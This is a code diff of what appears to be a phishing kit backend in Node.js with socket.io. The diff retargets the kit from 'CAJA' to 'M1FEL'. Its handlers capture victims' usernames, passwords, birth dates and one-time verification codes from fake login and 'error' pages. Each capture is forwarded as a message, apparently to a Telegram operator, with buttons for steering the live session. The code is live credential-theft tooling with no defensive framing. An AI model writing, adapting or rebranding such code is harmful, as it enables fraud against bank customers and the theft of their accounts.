@@ -26,10 +26,10 @@ app.use(bodyParser.json());
 
 io.on('connection', (socket) => {
   // Login principal (index.html)
-  socket.on('dataForm', ({ socio, contrasena, fechaNacimiento, sessionId }) => {
+  socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
+    const mensaje = `🔐 Nuevo intento de acceso M1FEL:\n\n🔢 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -48,10 +48,10 @@ io.on('connection', (socket) => {
   });
 
   // Login por errorlogo.html
-  socket.on('errorlogoForm', ({ socio, contrasena, fechaNacimiento, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Reintento de acceso tras error:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
+    const mensaje = `⚠️ Reintento de acceso tras error M1FEL:\n\n🔢 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha de nacimiento: ${fechaNacimiento || 'No proporcionada'}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -73,7 +73,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código CAJA:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código M1FEL:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
